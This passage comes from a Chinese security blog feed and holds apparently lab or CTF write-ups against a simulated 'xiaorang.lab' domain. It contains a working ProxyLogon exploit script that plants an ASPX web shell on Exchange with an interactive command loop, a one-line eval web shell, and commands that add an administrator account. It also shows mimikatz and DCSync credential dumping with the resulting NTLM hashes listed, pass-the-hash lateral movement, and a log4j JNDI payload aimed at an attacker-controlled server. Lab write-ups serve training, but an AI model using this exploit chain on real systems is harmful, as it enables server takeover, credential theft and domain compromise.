class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;X-CalculatedBETarget&quot;</span> <span class="keyword">in</span> ct.headers <span class="keyword">and</span> <span class="string">&quot;X-FEServer&quot;</span> <span class="keyword">in</span> ct.headers:</span><br><span class="line">            FQDN = ct.headers[<span class="string">&quot;X-FEServer&quot;</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;got FQDN:&quot;</span> + FQDN)</span><br><span class="line"></span><br><span class="line">        ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1941962757;&quot;</span> % FQDN,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: user_agent&#125;,</span><br><span class="line">            data=autoDiscoverBody,</span><br><span class="line">            proxies=proxies,</span><br><span class="line">            verify=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(ct.status_code)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Autodiscover Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;LegacyDN&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(ct.content):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can not get LegacyDN!&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            legacyDn = <span class="built_in">str</span>(ct.content).split(<span class="string">&quot;&lt;LegacyDN&gt;&quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">r&quot;&lt;/LegacyDN&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got DN: &quot;</span> + legacyDn)</span><br><span class="line"></span><br><span class="line">            mapi_body = legacyDn + \</span><br><span class="line">                <span class="string">&quot;\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/mapi-http&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Requesttype&quot;</span>: <span class="string">&quot;Connect&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Clientinfo&quot;</span>: <span class="string">&quot;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Clientapplication&quot;</span>: <span class="string">&quot;Outlook/15.0.4815.1002&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Requestid&quot;</span>: <span class="string">&quot;&#123;E2EA6C1C-E61B-49E9-9CFB-38184F907552&#125;:123456&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                data=mapi_body,</span><br><span class="line">                verify=<span class="literal">False</span>,</span><br><span class="line">                proxies=proxies</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span> <span class="keyword">or</span> <span class="string">&quot;act as owner of a UserMailbox&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(ct.content):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Mapi Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            sid = <span class="built_in">str</span>(ct.content).split(<span class="string">&quot;with SID &quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">&quot; and MasterAccountSid&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got SID: &quot;</span> + sid)</span><br><span class="line">            sid = sid.replace(sid.split(<span class="string">&quot;-&quot;</span>)[-<span class="number">1</span>], <span class="string">&quot;500&quot;</span>)</span><br><span class="line"></span><br><span class="line">            proxyLogon_request = <span class="string">&quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % sid</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                data=proxyLogon_request,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">241</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="string">&quot;set-cookie&quot;</span> <span class="keyword">in</span> ct.headers:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Proxylogon Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            sess_id = ct.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(</span><br><span class="line">                <span class="string">&quot;ASP.NET_SessionId=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            msExchEcpCanary = ct.headers[<span class="string">&#x27;set-cookie&#x27;</span>].split(<span class="string">&quot;msExchEcpCanary=&quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got session id: &quot;</span> + sess_id)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got canary: &quot;</span> + msExchEcpCanary)</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="comment"># &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % (</span></span><br><span class="line">                <span class="comment"># FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Admin@&#123;server_name&#125;:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&amp;schema=VirtualDirectory&amp;msExchEcpCanary=&#123;msExchEcpCanary&#125;&amp;a=~1942062522; ASP.NET_SessionId=&#123;sess_id&#125;; msExchEcpCanary=&#123;msExchEcpCanary1&#125;&quot;</span>.</span><br><span class="line">                            <span class="built_in">format</span>(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,</span><br><span class="line">                                    msExchEcpCanary=msExchEcpCanary),</span><br><span class="line">                            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line"></span><br><span class="line">                            &#125;,</span><br><span class="line">                            json=&#123;<span class="string">&quot;filter&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                                <span class="string">&quot;SelectedView&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;SelectedVDirType&quot;</span>: <span class="string">&quot;OAB&quot;</span>&#125;&#125;, <span class="string">&quot;sort&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">                            verify=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;GetOAB Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            oabId = <span class="built_in">str</span>(ct.content).split(<span class="string">&#x27;&quot;RawIdentity&quot;:&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got OAB id: &quot;</span> + oabId)</span><br><span class="line"></span><br><span class="line">            oab_json = &#123;<span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: oabId&#125;,</span><br><span class="line">                        <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;ExternalUrl&quot;</span>: <span class="string">&quot;http://ffff/#%s&quot;</span> % shell_content&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (</span><br><span class="line">                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                json=oab_json,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Set external url Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            reset_oab_body = &#123;<span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: oabId&#125;,</span><br><span class="line">                            <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,</span><br><span class="line">                                                <span class="string">&quot;FilePathName&quot;</span>: shell_absolute_path&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (</span><br><span class="line">                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><span class="line">                <span class="string">&quot;msExchLogonMailbox&quot;</span>: <span class="string">&quot;S-1-5-20&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                json=reset_oab_body,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                verify=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å†™å…¥shellå¤±è´¥&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">            shell_url = <span class="string">&quot;https://&quot;</span>+target+<span class="string">&quot;/owa/auth/test11.aspx&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æˆåŠŸå†™å…¥shellï¼š&quot;</span> + shell_url)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ä¸‹é¢éªŒè¯shellæ˜¯å¦ok&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;code=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll());&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è¯·æ±‚shell&quot;</span>)</span><br><span class="line">            <span class="keyword">import</span> time</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            data = requests.post(shell_url, data=&#123;</span><br><span class="line">                                <span class="string">&quot;code&quot;</span>: <span class="string">&quot;Response.Write(new ActiveXObject(\&quot;WScript.Shell\&quot;).exec(\&quot;whoami\&quot;).StdOut.ReadAll());&quot;</span>&#125;, verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> data.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å†™å…¥shellå¤±è´¥&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;shell:&quot;</span>+data.text.split(<span class="string">&quot;OAB (Default Web Site)&quot;</span>)</span><br><span class="line">                    [<span class="number">0</span>].replace(<span class="string">&quot;Name                            : &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+]ç”¨æˆ·å: &#x27;</span>+ new_email)</span><br><span class="line">                final_shell = shell_url</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-]ç”¨æˆ·å: &#x27;</span>+new_email)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=============================&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> final_shell:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ä¸‹é¢å¯ç”¨äº¤äº’å¼shell&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        input_cmd = <span class="built_in">input</span>(<span class="string">&quot;[#] command: &quot;</span>)</span><br><span class="line">        data=&#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;&quot;&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c %s&quot;).stdout.readall())&quot;&quot;&quot;</span> % input_cmd&#125;</span><br><span class="line">        ct = requests.post(</span><br><span class="line">            final_shell,</span><br><span class="line">            data=data,verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> ct.status_code != <span class="number">200</span> <span class="keyword">or</span> <span class="string">&quot;OAB (Default Web Site)&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ct.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Failed to execute shell command&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shell_response = ct.text.split(</span><br><span class="line">                <span class="string">&quot;Name                            :&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(shell_response)</span><br></pre></td></tr></table></figure><p>æ·»åŠ ç”¨æˆ·ä»¥rdp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Chu0 <span class="built_in">whoami</span>@666 /add</span><br><span class="line">net localgroup administrators Chu0 /add</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‹¿åˆ°flag2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator.XIAORANG\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>å†™ä¸ªshellè¿›å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>å†™å®Œshellä¹‹åå°±å¯ä»¥ç”¨systemæƒé™ä¸Šbloodhoundè¿›è¡Œä¸€æ³¢ä¿¡æ¯æ”¶é›†äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820211018740.png" alt="image-20240820211018740"></p><p>å‘ç°XIAORANG-EXC01å¯¹äºåŸŸå†…ç”¨æˆ·æœ‰WriteDACLæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æœºå™¨è´¦æˆ·ç»™è‡ªå·±ä¸€ä¸ªdcsyncæƒé™ï¼Œè¿›è€Œè·å¾—åŸŸç®¡å“ˆå¸Œ</p><p>å…ˆè·å–æœºå™¨ç”¨æˆ·å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="string">&quot;&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Username : XIAORANG-EXC01$</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : b898bfd97adaeac3165e21cc0c83e018</span><br></pre></td></tr></table></figure><p>èµ‹äºˆæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :b898bfd97adaeac3165e21cc0c83e018 -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>dumpå“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;XIAORANG-WIN16.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  b8fa79a52e918cb0cbcd1c0ede492647        514</span><br><span class="line">1137    HealthMailboxeda7a84    1e89e23e265bb7b54dc87938b1b1a131        66048</span><br><span class="line">1138    HealthMailbox33b01cf    0eff3de35019c2ee10b68f48941ac50d        66048</span><br><span class="line">1139    HealthMailbox9570292    e434c7db0f0a09de83f3d7df25ec2d2f        66048</span><br><span class="line">1140    HealthMailbox3479a75    c43965ecaa92be22c918e2604e7fbea0        66048</span><br><span class="line">1141    HealthMailbox2d45c5b    4822b67394d6d93980f8e681c452be21        66048</span><br><span class="line">1142    HealthMailboxec2d542    147734fa059848c67553dc663782e899        66048</span><br><span class="line">1143    HealthMailboxf5f7dbd    e7e4f69b43b92fb37d8e9b20848e6b66        66048</span><br><span class="line">1144    HealthMailbox67dc103    4fe68d094e3e797cfc4097e5cca772eb        66048</span><br><span class="line">1145    HealthMailbox320fc73    0c3d5e9fa0b8e7a830fcf5acaebe2102        66048</span><br><span class="line">1146    Lumia   862976f8b23c13529c2fb1428e710296        512</span><br><span class="line">500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512</span><br><span class="line">1000    XIAORANG-WIN16$ df9b69b6e7d4650b550889707f300328        532480</span><br><span class="line">1147    Zhangtong       22c7f81993e96ac83ac2f3f1903de8b4        512</span><br><span class="line">1103    XIAORANG-EXC01$ b898bfd97adaeac3165e21cc0c83e018        4096</span><br><span class="line">1104    XIAORANG-PC$    f3eb6c285c7a2b18307e3d0d1dc8bb21        4096</span><br><span class="line">1135    HealthMailbox8446c5b    40a4296ffa0b58bb805c36d8d3319df6        66048</span><br><span class="line">1136    HealthMailbox0d5918e    1e77e24cd23a786e6ae182ae2536dcb3        66048</span><br></pre></td></tr></table></figure><p>æ¨ªå‘DC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.2 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">C</span>:\users\administrator\flag\flag.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p>æ¨ªå‘26ï¼ŒLumiaç”¨æˆ·æ¡Œé¢æœ‰ä¸ªsecret.zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -codec gbk</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸Šé¢dumpçš„å“ˆå¸Œä¸‹è½½outlookä¸­çš„é‚®ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pthexchange.py --target https://172.22.3.9 --username Lumia --password <span class="string">&quot;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&quot;</span> --action Download</span><br></pre></td></tr></table></figure><p>è·å–çš„é‚®ä»¶é‡Œé¢æœ‰ä¸€ä¸ªè¡¨æ ¼ï¼Œé‡Œé¢æœ‰ä¸€å †æ‰‹æœºå·ï¼Œä½¿ç”¨æ‰‹æœºå·çˆ†ç ´å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john secret.zip &gt;zip.txt</span><br><span class="line">john --wordlist=1.txt zip.txt</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820214635822.png" alt="image-20240820214635822"></p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Certify</title>
    <link href="https://bowuchuling.github.io/posts/chunqiuCertify.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiuCertify.html</id>
    <published>2024-08-20T15:18:15.522Z</published>
    <updated>2024-08-20T15:34:58.161Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Certify</h1><h2 id="flag01">flag01</h2><p>fscanæ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 39.98.115.180   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">39.98.115.180:22 open</span></span><br><span class="line"><span class="string">39.98.115.180:80 open</span></span><br><span class="line"><span class="string">39.98.115.180:8983 open</span></span><br></pre></td></tr></table></figure><p>è®¿é—®39.98.115.180:8983å‘ç°æ˜¯solrç•Œé¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804013903746.png" alt="image-20240804013903746"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:rmi://ip:1099/7dbozo&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>æœç´¢å‘ç°solrçš„Ndayå­˜åœ¨log4jæ¼æ´ï¼Œå¯åŠ¨æ¶æ„æœåŠ¡å™¨åå¼¹shellï¼Œåœ¨core adminç•Œé¢å¡«å†™æ¶æ„payloadåadd 